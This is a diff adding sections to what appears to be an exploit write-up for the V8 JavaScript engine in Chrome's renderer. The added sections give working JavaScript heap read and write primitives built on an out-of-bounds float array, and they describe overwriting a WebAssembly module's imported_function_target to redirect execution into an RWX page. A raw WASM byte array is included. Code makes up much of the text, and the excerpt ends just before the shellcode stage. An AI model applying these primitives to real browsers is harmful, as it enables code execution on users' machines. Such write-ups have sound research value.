@@ -53,3 +53,46 @@ function addrOf(o) {
     return ftoi(fl_arr[0]) & 0xffffffffn;
 }
 ```
+Using the same method we can read  and write memory by assigning the address to fl_arr[0]
+
+```javascript
+function heap_read(addr) {
+
+    oob_arr[5] = itof((0x8n << 32n) | (addr-0x8n));
+    res = ftoi(fl_arr[0]);
+    return res;
+
+}
+function heap_write(addr, val) {
+
+    oob_arr[5] = itof((0x8n << 32n) | (addr-0x8n));
+    fl_arr[0] = itof(val);
+}
+```
+
+## Code execution in renderer process
+First, we obtain a way to hijack the execution target of a function, this allows us to redirect code execution to an arbitrary address. This can be obtained by getting the Imported_function_target address of a WebAssembly module.
+![image](https://github.com/user-attachments/assets/447944c9-4d32-4d47-9b5d-3d7908867bb3)
+
+Inspect the memory address of the WebAssembly module, imported_function_target  is located at offset 0x30 (this differs depending on v8 version)
+
+![image](https://github.com/user-attachments/assets/50058b01-f94a-457e-8afa-36b5da6b2bff)
+
+imported_function_target  address contains the address of the RWX page
+![image](https://github.com/user-attachments/assets/83599be4-505b-4ffc-81f9-682613d7655d)
+Confirm RX permissions
+![image](https://github.com/user-attachments/assets/01349ad2-0c8d-43eb-8ff3-fb08a7f3ad33)
+
+
+Define a WASM with imported function, obtain imported_function_target  and replace it with arbitrary value
+```javascript
+
+const importObject = {
+ imports: {imported_func : Math.sin},
+};
+
+var code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x00, 0x01, 0x7f, 0x02, 0x1b, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x08, 0x6a, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x33, 0x00, 0x00, 0x02, 0x6a, 0x73, 0x03, 0x74, 0x62, 0x6c, 0x01, 0x70, 0x00, 0x02, 0x03, 0x05, 0x04, 0x01, 0x01, 0x00, 0x00, 0x07, 0x10, 0x02, 0x06, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x32, 0x00, 0x03, 0x03, 0x70, 0x77, 0x6e, 0x00, 0x04, 0x09, 0x08, 0x01, 0x00, 0x41, 0x00, 0x0b, 0x02, 0x01, 0x02, 0x0a, 0x18, 0x04, 0x04, 0x00, 0x41, 0x2a, 0x0b, 0x05, 0x00, 0x41, 0xd3, 0x00, 0x0b, 0x04, 0x00, 0x41, 0x10, 0x0b, 0x06, 0x00, 0x41, 0x10, 0x10, 0x00, 0x0b]);
+var module = new WebAssembly.Module(code);
+var instance = new WebAssembly.Instance(module, importObject);
+var shellcode = instance.exports.func1;
+```
